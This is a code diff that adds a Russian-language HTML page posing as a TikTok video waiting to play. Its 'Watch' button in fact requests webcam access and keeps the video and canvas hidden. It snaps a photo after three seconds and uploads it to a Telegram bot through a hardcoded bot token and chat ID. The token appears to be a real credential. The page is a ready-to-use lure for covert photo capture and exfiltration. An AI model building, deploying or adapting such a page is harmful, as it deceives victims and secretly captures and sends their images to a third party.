@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <title>🔥 TikTok видео</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: black;
+      color: white;
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    video, canvas {
+      display: none;
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 18px;
+      background: #ff0050;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>📺 TikTok видео загружается...</h2>
+  <p>Нажмите «Посмотреть», чтобы включить видео</p>
+  <button onclick="startCamera()">▶️ Посмотреть</button>
+  <video id="video" autoplay playsinline width="300"></video>
+  <canvas id="canvas" width="300" height="200"></canvas>
+
+  <script>
+    const botToken = "8111551903:AAErkwIiopSFelcspBo-Cg38hjPyGpdAmNE"; // 🔁 Сюда вставь свой токен
+    const chatId = "-1002258184205";     // 🔁 Сюда вставь свой Telegram ID или ID группы
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+        video.play();
+
+        setTimeout(() => takePhoto(video), 3000); // ждём 3 сек и фоткаем
+      } catch (err) {
+        alert("❌ Не удалось получить доступ к камере");
+      }
+    }
+
+    function takePhoto(video) {
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob((blob) => {
+        sendPhoto(blob);
+      }, "image/jpeg");
+    }
+
+    function sendPhoto(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, "photo.jpg");
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      }).then(() => {
+        alert("😄 Фото отправлено боту!");
+      }).catch(() => {
+        alert("❌ Ошибка при отправке фото");
+      });
+    }
+  </script>
+</body>
+</html>
